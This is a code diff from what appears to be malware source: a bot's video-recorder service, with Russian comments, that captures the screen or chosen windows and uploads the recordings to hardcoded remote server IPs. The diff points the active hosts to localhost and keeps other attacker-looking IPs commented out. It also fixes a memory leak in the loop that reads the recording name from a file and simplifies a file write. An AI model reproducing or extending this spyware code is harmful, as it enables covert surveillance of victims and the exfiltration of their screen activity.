@@ -44,10 +44,10 @@ namespace VIDEORECDEBUGSTRINGS
 //	char VIDEO_REC_HOST1[] = "178.162.179.65";
 //	char VIDEO_REC_HOST2[] = "188.72.202.163";
 
-//	char VIDEO_REC_HOST1[] = "127.0.0.1";
-//	char VIDEO_REC_HOST2[] = "127.0.0.1";
-	char VIDEO_REC_HOST1[] = "192.168.147.2";
-	char VIDEO_REC_HOST2[] = "193.106.161.242";
+	char VIDEO_REC_HOST1[] = "127.0.0.1";
+	char VIDEO_REC_HOST2[] = "127.0.0.1";
+//	char VIDEO_REC_HOST1[] = "192.168.147.2";
+//	char VIDEO_REC_HOST2[] = "193.106.161.242";
 #else
 	//Адрес сервера куда пишем видео
 	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
@@ -657,17 +657,18 @@ namespace VideoRecorderSrv
 		while (1)
 		{
 			// Читаем имя записи из файла
-			TBotFileStream FileStream(FileName.t_str(), fcmRead);
+			TBotFileStream *FileStream = new TBotFileStream(FileName.t_str(), fcmRead);
 
-			if (!FileStream.Valid())
+			if (!FileStream->Valid())
 			{
 				// Не удалось открыть файл, видимо занят
+				delete FileStream;
 				pSleep(1000);
 				continue;
 			}
 
 			// Проверяем максимальный интервал записи
-			DWORD  WriteTime = File::LastWriteTime(FileStream.Handle());
+			DWORD  WriteTime = File::LastWriteTime(FileStream->Handle());
 			if (WriteTime > MaxRecordTime)
 			{
 				// Превышено время записи. Прерываем процесс
@@ -676,7 +677,7 @@ namespace VideoRecorderSrv
             }
 
 			//  Проверяем изменения настроек
-			string Name = FileStream.ReadToString();
+			string Name = FileStream->ReadToString();
 
 			if (Name.IsEmpty())
 				Name = "FullScr";
@@ -690,7 +691,7 @@ namespace VideoRecorderSrv
 				Recorder.RecordWnd(0);
             }
 
-
+            delete FileStream;
 			pSleep(SleepInterval);
 		}
 
@@ -725,14 +726,7 @@ namespace VideoRecorderSrv
 			DWORD Len = STRA::Length(Name);
 			// При записи учитываем, что файл может быть занят
 			if (Len)
-			while (1)
-			{
-				DWORD Writen = File::WriteBufferA(FileName.t_str(), Name, Len);
-				if (Writen == Len)
-					break;
-				else
-					pSleep(10);
-			}
+				File::WriteBufferA(FileName.t_str(), Name, Len);
         }
 
 		// запускаем запись
